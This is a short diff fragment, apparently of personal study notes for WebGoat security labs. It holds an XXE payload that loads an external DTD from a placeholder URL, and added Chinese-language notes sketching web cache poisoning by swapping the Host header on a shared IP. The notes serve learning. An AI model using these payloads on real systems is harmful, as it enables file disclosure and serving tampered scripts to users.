@@ -16,3 +16,26 @@ java docker webgoat
 %eval;
 
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]><comment>  <text>&eval;</text></comment>
+
+假如 访问b网站 请求ip 1.1.1.1
+GET /1.TXT
+HOST B.COM
+
+B.COM   ----->查找B取出1.txt缓存到服务器上
+
+ip 1.1.1.1
+GET /2.JS
+HOST:A.COM
+A.COM  2.js取出来缓存在服务器上
+
+GET /2.JS
+HOST:B.COM
+
+取出来缓存在服务器上得2.js 污染成功
+
+
+
+
+
+
+  
